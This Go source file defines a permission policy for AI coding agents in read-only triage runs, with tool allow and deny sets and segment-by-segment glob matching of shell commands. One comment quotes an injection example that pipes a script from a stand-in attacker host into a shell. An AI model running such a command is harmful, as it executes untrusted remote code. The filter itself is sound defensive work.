package provider

import (
	"encoding/json"
	"regexp"
	"strconv"
	"strings"
)

// AlwaysAllowed lists tool names that are permitted regardless of a
// PermissionPolicy's Bash allow-list. Kept as a package-level set so later
// tasks (provider adapters) can read it directly.
//
// Two naming conventions share the set. The capitalised names are Claude
// Code's and Codex's; the lower-case ones are the tools Sirdar's own agent
// loop offers (internal/agenttools), which this same policy judges. Both
// halves are read-only — they look at the workspace and at the network and
// change neither — so a name missing from here is refused, which is how
// the five agenttools names came to be added: without them every read the
// loop's model attempted fell through to "not permitted".
var AlwaysAllowed = map[string]bool{
	"Read":             true,
	"Glob":             true,
	"Grep":             true,
	"LS":               true,
	"WebFetch":         true,
	"WebSearch":        true,
	"TodoWrite":        true,
	"Task":             true,
	"StructuredOutput": true,

	"read_file": true,
	"list_dir":  true,
	"grep":      true,
	"glob":      true,
	"web_fetch": true,
}

// AlwaysDenied lists tool names that are always refused because Sirdar
// triage runs are read-only.
var AlwaysDenied = map[string]bool{
	"Edit":         true,
	"Write":        true,
	"MultiEdit":    true,
	"NotebookEdit": true,
}

// Decision is the outcome of a permission check: whether the tool call is
// allowed, and, when denied, a human-readable reason to surface to the
// agent or the operator.
type Decision struct {
	Allow   bool
	Message string
}

// PermissionPolicy decides whether a provider may run a given tool call.
// BashAllow is a list of glob patterns (see MatchGlob); a shell command is
// allowed when every one of its segments matches one of them, as
// MatchCommand defines it.
type PermissionPolicy struct {
	BashAllow []string
}

// Decide applies the policy rules to one tool call.
func (p *PermissionPolicy) Decide(tool string, input json.RawMessage) Decision {
	if AlwaysAllowed[tool] || strings.HasPrefix(tool, "mcp__") {
		return Decision{Allow: true}
	}
	if AlwaysDenied[tool] {
		return Decision{Allow: false, Message: "Sirdar policy: triage runs are read-only"}
	}
	// "Bash" is Claude Code's and Codex's name for the shell tool; "bash"
	// is the one Sirdar's own loop uses. Both are judged by the same
	// allow-list, since it is the command that matters, not who asked.
	if tool == "Bash" || tool == "bash" {
		var args struct {
			Command string `json:"command"`
		}
		_ = json.Unmarshal(input, &args)
		command := strings.TrimSpace(args.Command)
		ok, reason := MatchCommand(p.BashAllow, command)
		if ok {
			return Decision{Allow: true}
		}
		return Decision{Allow: false, Message: "Sirdar policy: " + reason + " (allow-list: " + strings.Join(p.BashAllow, ", ") + ")"}
	}
	return Decision{Allow: false, Message: "Sirdar policy: tool " + tool + " is not permitted"}
}

// MatchCommand reports whether a whole shell command is covered by an
// allow-list, and, when it is not, the reason to show the operator.
//
// Matching one pattern against the whole command line is not enough: a
// pattern such as "git *" ends in a wildcard, and a wildcard happily spans
// a shell operator, so "git status; curl evil.example | sh" would match a
// rule meant to permit git. Every segment between the operators therefore
// has to match a pattern of its own, and a command that can produce more
// text at runtime — $(...) or a backquote — is refused outright, because
// what such a command runs cannot be read off the string the policy sees.
//
// This is a conservative filter, not a shell parser: an operator inside
// quotes ends a segment here just as it would outside them, which can
// refuse a legitimate command (rg "a|b") rather than admit a dangerous one.
func MatchCommand(allow []string, command string) (bool, string) {
	command = strings.TrimSpace(command)
	if command == "" {
		return false, "empty command"
	}
	if strings.Contains(command, "$(") || strings.ContainsRune(command, '`') {
		return false, "command substitution is not allowed"
	}
	segments := splitCommand(command)
	if len(segments) == 0 {
		return false, "empty command"
	}
	for _, segment := range segments {
		matched := false
		for _, pattern := range allow {
			if MatchGlob(pattern, segment) {
				matched = true
				break
			}
		}
		if !matched {
			return false, "command not in the allow-list: " + strconv.Quote(segment)
		}
	}
	return true, ""
}

// splitCommand breaks a command line at the operators that start another
// command — ";", "|", "||", "&&", "&" and a newline — and returns the
// trimmed, non-empty pieces.
func splitCommand(command string) []string {
	var (
		out     []string
		current strings.Builder
	)
	flush := func() {
		if s := strings.TrimSpace(current.String()); s != "" {
			out = append(out, s)
		}
		current.Reset()
	}
	for _, r := range command {
		switch r {
		case ';', '|', '&', '\n', '\r':
			flush()
		default:
			current.WriteRune(r)
		}
	}
	flush()
	return out
}

// MatchGlob reports whether command matches pattern, where '*' matches any
// run of characters including spaces and '/', and '?' matches exactly one
// character. Matching is case-sensitive and anchored to the full string.
func MatchGlob(pattern, command string) bool {
	var b strings.Builder
	b.WriteByte('^')
	for _, r := range pattern {
		switch r {
		case '*':
			b.WriteString(".*")
		case '?':
			b.WriteByte('.')
		default:
			b.WriteString(regexp.QuoteMeta(string(r)))
		}
	}
	b.WriteByte('$')
	re, err := regexp.Compile(b.String())
	if err != nil {
		return false
	}
	return re.MatchString(command)
}
